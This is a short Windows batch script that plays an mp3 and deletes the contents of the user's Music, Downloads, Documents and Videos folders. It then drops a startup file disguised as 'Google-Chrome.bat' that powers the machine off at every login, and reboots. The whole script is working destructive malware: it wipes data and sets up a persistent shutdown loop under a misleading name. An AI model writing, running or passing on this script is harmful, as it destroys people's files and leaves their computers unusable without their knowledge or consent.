@echo off
start /min wokeuplikethis.mp3
cd C:\users\%USERNAME%
del /q Music
del /q Downloads
del /q Documents
del /q Videos
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
echo shutdown.exe /p > Google-Chrome.bat 
shutdown.exe /r
exit